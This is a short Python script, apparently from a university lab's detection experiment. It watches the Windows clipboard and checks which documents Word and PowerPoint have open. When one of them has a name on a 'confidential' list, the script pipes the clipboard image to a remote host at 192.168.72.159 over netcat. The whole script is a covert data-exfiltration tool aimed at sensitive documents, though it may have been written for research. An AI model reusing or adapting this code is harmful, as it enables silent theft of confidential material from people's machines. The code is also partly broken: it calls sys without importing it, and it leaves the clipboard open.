#C:\Users\Wave\AppData\Local\Programs\Python\Python36-32\Lib\site-packages\win32\test

from PIL import ImageGrab
import win32clipboard
import win32con
import time
import datetime
import subprocess
import wmi
import re
import os
from subprocess import check_output

def checkConfidential(m):
	confidentialList = ['sensitive', 'b']
	for findex in confidentialList:
		if(m[0][0] == findex):
			return True
	return False
	
def getProcessId(pidList):
	for i in wmi.WMI().Win32_Process():
		if i.Name == 'POWERPNT.EXE' or i.Name == 'WINWORD.EXE':
			print('%s, %s, %s, %s' % (i.Name, i.ProcessId, i.CommandLine, i.GetOwner()[2]))
			pidList.append(i.ProcessId)
	
	return pidList
	
def extractFileName():
	with open('Output.txt', 'r') as myfile:
		data = myfile.read()

	m = re.findall(r".*File.*\\(.*)(.pptx|.docx).*", data)
	print(m)
	trigger = checkConfidential(m)
	return trigger

def getAppHanle(pidList):	
	for i in pidList:
		out = subprocess.call('handle64.exe -p ' + str(i) + ' > Output.txt', shell=True)
		print (i)
		trigger = extractFileName()
	return trigger
	
def processmain():
	pidList = [] #inital
	getProcessId(pidList)
	trigger = getAppHanle(pidList)
	return trigger

def saveClipboardImage():
	# timestamp to datetime >> dt = datetime.datetime.fromtimestamp(t)
	# save clipboard to file
	im = ImageGrab.grabclipboard()
	t = str(time.time())
	im.save('somefile.png','PNG')
	print('AAA')
	cmdnc = 'nc.exe 192.168.72.159 8087 < C:\\Workspace\\NTUST\\isLab\\exp_detection\\somefile.png'
	check_output(cmdnc, shell=True).decode(sys.stdout.encoding)
	print('Transmit')
	
def detectClipboardChange(clipboardHandle):
	# to check change
	win32clipboard.OpenClipboard()
	try:
		handle = win32clipboard.GetClipboardDataHandle(win32con.CF_BITMAP)
		if clipboardHandle != str(handle):
			trigger = processmain()
			print('B')
			if(trigger):
				saveClipboardImage()
				print (handle)
				clipboardHandle = str(handle)
				return clipboardHandle
			else:
				print('not sensitive')
		else:
			print ('Clipboard not changed')
			return clipboardHandle
	except TypeError:
		print ('Not Image')
		win32clipboard.CloseClipboard()
	except:
		#print ('Some thing error')
		print ('')

def main():
	clipboardHandle = '' # initial

	while True:
		clipboardHandle = detectClipboardChange(clipboardHandle)
		time.sleep(5)
	
if __name__ == '__main__':
    main()

